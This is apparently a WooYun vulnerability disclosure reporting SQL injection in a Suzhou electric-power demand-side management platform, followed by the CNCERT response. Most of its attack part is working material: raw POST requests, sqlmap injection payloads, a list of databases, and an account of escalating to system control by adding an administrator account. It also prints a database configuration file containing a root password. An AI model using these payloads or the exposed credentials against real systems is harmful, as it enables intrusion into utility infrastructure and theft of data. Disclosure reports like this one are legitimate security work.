wybug_title: 苏州市电力某系统SQL注入导致服务器沦陷（DBA权限）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-19：	细节已通知厂商并且等待厂商处理中									2015-12-23：	厂商已经确认，细节仅向厂商公开									2016-01-02：	细节向核心白帽子及相关领域专家公开									2016-01-12：	细节向普通白帽子公开									2016-01-22：	细节向实习白帽子公开									2016-02-04：	细节向公众公开  简要描述： 权限很高的数据库 详细说明：  苏州市电力需求侧管理平台
**.**.**.**/
输入框不存在注入，但是有个找回密码的选项还有一个越权操作处也存在注入




POST /xm/answer.php HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/xm/Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 7tel=%27



POST /xm/modify.php HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/xm/answer.phpConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 15answer=*&tel=*


多个参数都存在注入
Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: answer=' AND 3053=3053 AND 'ZBCd'='ZBCd&tel=    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: answer=' AND (SELECT 8462 FROM(SELECT COUNT(*),CONCAT(0x716a6b6a71,(SELECT (ELT(8462=8462,1))),0x716b707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'yfdd'='yfdd&tel=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: answer=' AND (SELECT * FROM (SELECT(SLEEP(5)))fcIr) AND 'AFwQ'='AFwQ&tel=    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: answer=-5528' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x77534e4e744b676562567968796d4e4b6f724147754b674741484976474f6d6169766e5659574c76,0x716b707a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&tel=---[21:19:26] [INFO] testing MySQL[21:19:26] [INFO] confirming MySQL[21:19:26] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.9, PHP 5.5.12back-end DBMS: MySQL >= 5.0.0
数据库DBA权限

数据库
available databases [10]:[*] db_biouxigas[*] db_ent_num[*] db_lianhua[*] db_linde[*] db_szdsjm[*] ent_database_info[*] information_schema[*] mysql[*] performance_schema[*] test
   漏洞证明：  之后利用之前爆出来的路径D:\wamp\www,与系统进行交互，进而控制整个服务器。很好，system权限

添加管理员temp/adm!n123顺利登陆服务器



数据库
<?php    DEFINE ('DB_USER','root');    DEFINE ('DB_PASSWORD','sudawl');    DEFINE ('DB_HOST','localhost');    DEFINE ('DB_NAME','db_szdsjm');        $conn = @mysqli_connect(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME) OR die ('Could not connect to MySQL:' . mysqli_connect_error());        mysqli_set_charset($conn,'gbk');?>
登陆了一个用户试试



   修复方案：  1.数据库降权2.SQL注入这个问题使用正则过滤   版权声明：转载请注明来源 默之@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-12-23 10:21 厂商回复： CNVD确认所述情况,已经转由CNCERT向能源行业信息化主管部门通报,由其后续协调网站管理单位处置；同时转由CNCERT发江苏分中心。 最新状态： 暂无
